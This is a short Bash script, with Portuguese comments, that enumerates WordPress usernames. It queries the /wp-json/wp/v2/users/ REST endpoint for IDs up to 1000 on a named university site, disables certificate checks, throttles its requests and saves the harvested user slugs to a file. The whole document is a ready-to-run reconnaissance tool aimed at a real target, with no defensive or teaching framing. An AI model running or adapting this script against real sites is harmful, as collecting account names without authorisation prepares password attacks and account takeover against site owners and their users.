#!/bin/bash

#Create by: x57all
#v1.0
#Enumerador de usuarios do wordpress
#Wordpress user enumerator
# Format to grep: "slug": "grep",

results_tmp='/tmp/enumerador_slugs_wp'
output='./slugs.txt.mestrado'
site='http://mestrado.iesb.br/wp-json/wp/v2/users/' # <-- Change the URL
n=1000                                              # <-- The first N users

print_progress() {
    local progress=$1
    local total=$2
    local length=30 
    local percent=$((progress * 100 / total))
    local filled_length=$((progress * length / total))
    local empty_length=$((length - filled_length))
    printf "["
    printf "%${filled_length}s" | tr ' ' '='
    printf "%${empty_length}s" | tr ' ' ' '
    printf "] %d%%\r" "$percent"
}

r=$n
i=0

for ((i=0;i<=r;i++));do
    curl $site$i -k -s >> $results_tmp
    #echo "LOG INFO: curl $site$i -k -s >> $results_tmp" #Debug
    sleep 3
    #printf "req $i" >> $results_tmp 
    print_progress "$i" "$r"
done

printf "\n"
echo '[+] Extraindo SLUGS'

jq . $results_tmp | rg slug >> $output

N=1
while read -r line; do 
    echo "$line" | sed -e "s/slug/user$N/g"
    N=$((N+1))
done < $output > $output.tmp && mv $output.tmp $output


#Remove temp file
if [ -e $results_tmp ];then
    echo "[+] Removendo o arquivo $results_tmp"
    rm -rf $results_tmp
    if [ $? -eq 0 ];then
        echo "[+] Arquivo removido com sucesso"
    else
        echo "[!] Error ao remover o arquivo"
    fi
else
    echo "[-] O arquivo $results_tmp nao existe!"
fi
echo "[+] Arquivo output: $output"
echo "Good Lucky!"

